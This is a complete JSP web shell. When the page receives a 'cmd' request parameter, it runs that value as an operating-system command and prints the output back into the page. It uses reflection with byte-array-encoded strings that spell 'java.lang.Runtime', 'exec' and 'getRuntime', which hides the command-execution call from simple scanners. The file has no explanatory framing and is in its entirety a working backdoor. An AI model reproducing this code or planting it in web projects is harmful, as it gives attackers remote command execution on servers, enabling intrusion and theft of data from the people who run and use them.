<%@ page contentType="text/html;charset=UTF-8"  language="java" %>
<%
    if(request.getParameter("cmd")!=null){
        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;byte[] b = new byte[2048];out.print("<pre>");
        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("</pre>");
    }
%>